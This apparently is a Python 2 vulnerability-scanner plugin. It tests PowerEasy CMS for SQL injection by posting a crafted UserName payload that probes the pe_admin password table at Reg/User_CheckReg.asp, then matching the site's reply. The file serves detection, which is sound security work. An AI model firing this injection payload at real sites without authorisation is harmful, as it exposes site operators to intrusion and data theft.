#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        detail = u''
        key=u'已经存在！请换一个用户名再试试！'
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"Reg/User_CheckReg.asp")
        data="UserName=admin' and%20exists(select%20password%20from%20pe_admin) and '1'='1"
        headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5","Accept": "text/plain"}
        
        
        
        
        
        
        
        
        
        #res, content = http.request(expurl,"POST",data,headers)
        res, content = yx_httplib2_request(http,expurl,"POST",data,headers)
        #print content
        if res['status'] == '200' and content.find('select password from pe_admin')>=0 and (content.find(key.encode('utf8'))>=0 or content.find(key.encode('gbk'))>=0):
            #print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
            request = postRequest(expurl,"POST",headers,data)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:PowerEasy_User_CheckReg_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:PowerEasy_User_CheckReg_SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
